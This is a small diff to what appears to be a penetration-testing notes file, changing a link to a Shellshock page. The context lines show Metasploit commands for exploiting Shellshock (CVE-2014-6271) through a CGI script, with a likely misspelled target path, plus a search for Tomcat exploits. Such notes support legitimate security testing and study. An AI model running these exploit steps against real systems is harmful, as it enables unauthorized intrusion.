@@ -213,7 +213,7 @@ __Start netcat__
 /gettime.cgi Bash CVE-2014-6271 Vulnerability (Shellshock)
   - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
     - __`set TARGETURI /gettime.cig`__
-  - [Shellshock](/Q&A/Shellshock.md)
+  - [Shellshock](/Cgi/Shellshock.md)
 
 Apache Tomcat 8080
   - __`search type:exploit tomcat`__
